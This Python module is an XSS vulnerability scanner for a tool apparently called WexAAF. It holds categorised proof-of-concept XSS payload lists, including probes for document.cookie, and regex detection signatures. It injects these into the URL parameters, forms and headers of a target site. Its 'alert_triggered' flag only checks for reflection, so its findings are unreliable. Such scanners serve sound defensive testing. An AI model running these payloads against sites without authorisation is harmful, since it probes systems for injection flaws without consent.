"""
XSS Scanner Module for WexAAF
Detects Cross-Site Scripting vulnerabilities
"""

import re
from .utils import Colors


class XSSScanner:
    """
    XSS Vulnerability Scanner class
    """
    
    # XSS payloads organized by type
    PAYLOADS = {
        'Reflected': [
            '<script>alert(1)</script>',
            '<script>alert("XSS")</script>',
            '<script>confirm(1)</script>',
            '<script>prompt(1)</script>',
            '<img src=x onerror=alert(1)>',
            '<img src=1 onerror=alert(1)>',
            '<svg onload=alert(1)>',
            '<body onload=alert(1)>',
            '<input onfocus=alert(1) autofocus>',
            '<select onfocus=alert(1) autofocus><option>x</option><option>y</option></select>',
            '<textarea onfocus=alert(1) autofocus>',
            '<keygen onfocus=alert(1) autofocus>',
            '<video><source onerror="alert(1)">',
            '<audio src=x onerror=alert(1)>'
        ],
        'Stored': [
            '<script>alert(1)</script>',
            '<img src=x onerror=alert(1)>',
            '<svg/onload=alert(1)>',
            '"><script>alert(1)</script>',
            '"><img src=x onerror=alert(1)>',
            '<iframe src="javascript:alert(1)">',
            '<details open ontoggle=alert(1)>',
            '<marquee onstart=alert(1)>',
        ],
        'DOM-based': [
            '<img src=x onerror=alert(1)>',
            '<svg/onload=alert(1)>',
            '<script>alert(document.domain)</script>',
            '<script>alert(document.cookie)</script>',
            '<input value="<script>alert(1)</script>">'
        ],
        'Polyglot': [
            '--><script>alert(1)</script>',
            'javascript:/*--><script>alert(1)</script>',
            'javascript:"/*--><script>alert(1)</script>',
            '%3Cscript%3Ealert(1)%3C/script%3E',
            '<script>alert(String.fromCharCode(88,83,83))</script>'
        ],
        'Encoded': [
            '%3Cscript%3Ealert(1)%3C/script%3E',
            '%253Cscript%253Ealert(1)%253C/script%253E',
            '&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;',
            '&#60;script&#62;alert(1)&#60;/script&#62;',
            '\u003Cscript\u003Ealert(1)\u003C/script\u003E'
        ],
        'Event-Based': [
            'onmouseover=alert(1)',
            'onclick=alert(1)',
            'onerror=alert(1)',
            'onload=alert(1)',
            'onfocus=alert(1)',
            'onblur=alert(1)',
            'ondblclick=alert(1)',
            'onkeydown=alert(1)'
        ]
    }
    
    XSS_SIGNATURES = [
        r'<script[^>]*>.*?</script>',
        r'<img[^>]*onerror[^>]*>',
        r'<svg[^>]*onload[^>]*>',
        r'javascript:',
        r'on\w+\s*=\s*["\']?\s*alert',
        r'on\w+\s*=\s*["\']?\s*confirm',
        r'on\w+\s*=\s*["\']?\s*prompt',
        r'document\.cookie',
        r'document\.domain',
        r'expression\s*\(',
        r'@[a-z]+\s*\(',
        r'data:text/html'
    ]
    
    def __init__(self, http_handler):
        """
        Initialize XSS Scanner
        
        Args:
            http_handler: HTTPHandler instance
        """
        self.http_handler = http_handler
    
    def scan_xss(self):
        """
        Scan for XSS vulnerabilities
        
        Returns:
            dict: XSS scan results
        """
        print(f"{Colors.CYAN}[i] Starting XSS vulnerability scan...{Colors.RESET}")
        
        vulnerabilities = []
        tested_points = []
        
        # Get URL parameters
        parameters = self.http_handler.extract_parameters()
        
        if parameters:
            print(f"{Colors.CYAN}[i] Testing URL parameters: {', '.join(parameters)}{Colors.RESET}")
            
            for param in parameters:
                # Test each XSS payload type
                for xss_type, payloads in self.PAYLOADS.items():
                    param_vulns = self._test_parameter_xss(param, payloads, xss_type)
                    vulnerabilities.extend(param_vulns)
                    tested_points.append({'parameter': param, 'type': xss_type, 'tested': len(payloads)})
        
        # Test forms
        forms = self.http_handler.extract_forms()
        if forms:
            print(f"{Colors.CYAN}[i] Testing {len(forms)} form(s) for XSS...{Colors.RESET}")
            
            for form in forms:
                form_vulns = self._test_form_xss(form)
                vulnerabilities.extend(form_vulns)
        
        # Test headers
        print(f"{Colors.CYAN}[i] Testing HTTP headers for XSS...{Colors.RESET}")
        header_vulns = self._test_headers_xss()
        vulnerabilities.extend(header_vulns)
        
        # Check if XSS is already present in page
        print(f"{Colors.CYAN}[i] Checking for existing XSS in page...{Colors.RESET}")
        existing_xss = self._check_existing_xss()
        if existing_xss:
            vulnerabilities.extend(existing_xss)
        
        print(f"{Colors.CYAN}[i] XSS scan complete. Found {len(vulnerabilities)} potential vulnerabilities{Colors.RESET}")
        
        return {
            'vulnerabilities': vulnerabilities,
            'total_tested': len(tested_points),
            'vulnerability_count': len(vulnerabilities)
        }
    
    def _test_parameter_xss(self, param, payloads, xss_type):
        """
        Test XSS in URL parameters
        
        Args:
            param (str): Parameter name
            payloads (list): XSS payloads to test
            xss_type (str): Type of XSS
        
        Returns:
            list: Found vulnerabilities
        """
        vulnerabilities = []
        
        for payload in payloads:
            response = self._test_xss_payload(param, payload)
            
            if response['success']:
                if self._check_xss_reflection(response, payload):
                    if response.get('alert_triggered'):
                        vulnerabilities.append({
                            'type': xss_type,
                            'method': 'URL Parameter',
                            'parameter': param,
                            'payload': payload,
                            'location': response['url'],
                            'reflected': True,
                            'alert_triggered': True,
                            'severity': 'High'
                        })
                    else:
                        vulnerabilities.append({
                            'type': xss_type,
                            'method': 'URL Parameter',
                            'parameter': param,
                            'payload': payload,
                            'location': response['url'],
                            'reflected': True,
                            'alert_triggered': False,
                            'severity': 'Medium'
                        })
        
        return vulnerabilities
    
    def _test_form_xss(self, form):
        """
        Test XSS in HTML forms
        
        Args:
            form (dict): Form dictionary
        
        Returns:
            list: Found vulnerabilities
        """
        vulnerabilities = []
        
        # Test each input field
        for input_field in form.get('inputs', []):
            field_name = input_field.get('name')
            field_type = input_field.get('type', 'text')
            
            if not field_name:
                continue
            
            # Skip certain field types
            if field_type in ['hidden', 'submit', 'button', 'reset']:
                continue
            
            # Test with a few representative payloads
            test_payloads = [
                '<script>alert(1)</script>',
                '<img src=x onerror=alert(1)>',
                '<svg onload=alert(1)>',
                '"><script>alert(1)</script>'
            ]
            
            for payload in test_payloads:
                form_data = {field_name: payload}
                
                # Prepare form action URL
                action = form.get('action', '')
                if action and not action.startswith(('http://', 'https://')):
                    base_url = self.http_handler.target_url
                    if action.startswith('/'):
                        base_url = base_url.split('/')[0] + '//' + base_url.split('/')[2]
                        action = base_url + action
                    else:
                        action = self.http_handler.target_url.rsplit('/', 1)[0] + '/' + action
                
                method = form.get('method', 'GET')
                
                if method.upper() == 'POST':
                    response = self.http_handler.post(url=action, data=form_data)
                else:
                    response = self.http_handler.get(url=action, params=form_data)
                
                if response['success']:
                    if self._check_xss_reflection(response, payload):
                        vulnerabilities.append({
                            'type': 'Stored/Potential',
                            'method': 'Form Input',
                            'field': field_name,
                            'payload': payload,
                            'form_action': action,
                            'reflected': True,
                            'severity': 'Medium'
                        })
        
        return vulnerabilities
    
    def _test_headers_xss(self):
        """
        Test XSS in HTTP headers
        
        Returns:
            list: Found vulnerabilities
        """
        vulnerabilities = []
        
        # Test User-Agent header
        test_payload = '<script>alert(1)</script>'
        headers = {'User-Agent': test_payload}
        response = self.http_handler.get(headers=headers)
        
        if response['success']:
            if self._check_xss_reflection(response, test_payload):
                vulnerabilities.append({
                    'type': 'Reflected',
                    'method': 'HTTP Header',
                    'header': 'User-Agent',
                    'payload': test_payload,
                    'reflected': True,
                    'severity': 'Low'
                })
        
        # Test Referer header
        headers = {'Referer': test_payload}
        response = self.http_handler.get(headers=headers)
        
        if response['success']:
            if self._check_xss_reflection(response, test_payload):
                vulnerabilities.append({
                    'type': 'Reflected',
                    'method': 'HTTP Header',
                    'header': 'Referer',
                    'payload': test_payload,
                    'reflected': True,
                    'severity': 'Low'
                })
        
        return vulnerabilities
    
    def _test_xss_payload(self, param, payload):
        """
        Test XSS payload in parameter
        
        Args:
            param (str): Parameter name
            payload (str): XSS payload
        
        Returns:
            dict: Response with XSS detection info
        """
        url = self.http_handler.target_url
        
        # Replace parameter value with payload
        if '?' in url:
            base_url, query_string = url.split('?', 1)
            params = query_string.split('&')
            modified_params = []
            
            for p in params:
                if p.startswith(f'{param}='):
                    modified_params.append(f'{param}={payload}')
                else:
                    modified_params.append(p)
            
            modified_url = f'{base_url}?{"&".join(modified_params)}'
        else:
            modified_url = f'{url}?{param}={payload}'
        
        response = self.http_handler.get(modified_url)
        
        # Check for alert execution (simulated - in real scenario would use browser)
        if response['success']:
            content = response.get('content', '').lower()
            
            # Check if payload is reflected without proper encoding
            # This is a simplified check
            if payload.lower() in content.lower():
                response['alert_triggered'] = True
            else:
                response['alert_triggered'] = False
        
        return response
    
    def _check_xss_reflection(self, response, payload):
        """
        Check if XSS payload is reflected in response
        
        Args:
            response (dict): HTTP response
            payload (str): XSS payload
        
        Returns:
            bool: True if reflected
        """
        if not response['success']:
            return False
        
        content = response.get('content', '')
        payload_lower = payload.lower()
        content_lower = content.lower()
        
        # Check if payload is present
        if payload_lower in content_lower:
            return True
        
        # Check for XSS signatures
        for signature in self.XSS_SIGNATURES:
            if re.search(signature, content_lower, re.IGNORECASE):
                return True
        
        return False
    
    def _check_existing_xss(self):
        """
        Check if XSS is already present in the page
        
        Returns:
            list: Found existing XSS
        """
        vulnerabilities = []
        response = self.http_handler.get()
        
        if not response['success']:
            return vulnerabilities
        
        content = response.get('content', '')
        
        # Check for XSS patterns
        for signature in self.XSS_SIGNATURES:
            matches = re.findall(signature, content, re.IGNORECASE)
            
            if matches:
                vulnerabilities.append({
                    'type': 'Existing',
                    'method': 'Static Analysis',
                    'signature': signature,
                    'matches': len(matches),
                    'reflected': True,
                    'severity': 'Medium',
                    'location': self.http_handler.target_url
                })
        
        return vulnerabilities
    
    def analyze_xss_context(self, vulnerabilities):
        """
        Analyze the context of XSS vulnerabilities
        
        Args:
            vulnerabilities (list): List of XSS vulnerabilities
        
        Returns:
            dict: XSS context analysis
        """
        analysis = {
            'total': len(vulnerabilities),
            'by_type': {},
            'by_severity': {},
            'by_method': {},
            'recommendations': []
        }
        
        # Categorize by type
        for vuln in vulnerabilities:
            xss_type = vuln.get('type', 'Unknown')
            if xss_type not in analysis['by_type']:
                analysis['by_type'][xss_type] = 0
            analysis['by_type'][xss_type] += 1
            
            # Categorize by severity
            severity = vuln.get('severity', 'Unknown')
            if severity not in analysis['by_severity']:
                analysis['by_severity'][severity] = 0
            analysis['by_severity'][severity] += 1
            
            # Categorize by method
            method = vuln.get('method', 'Unknown')
            if method not in analysis['by_method']:
                analysis['by_method'][method] = 0
            analysis['by_method'][method] += 1
        
        # Generate recommendations
        if analysis['total'] > 0:
            analysis['recommendations'].append('Implement proper input validation')
            analysis['recommendations'].append('Use output encoding (HTML, JavaScript, URL)')
            analysis['recommendations'].append('Implement Content Security Policy (CSP)')
            analysis['recommendations'].append('Set HTTP headers: X-XSS-Protection, X-Content-Type-Options')
            analysis['recommendations'].append('Use secure frameworks with built-in XSS protection')
            analysis['recommendations'].append('Sanitize all user input before display')
        
        return analysis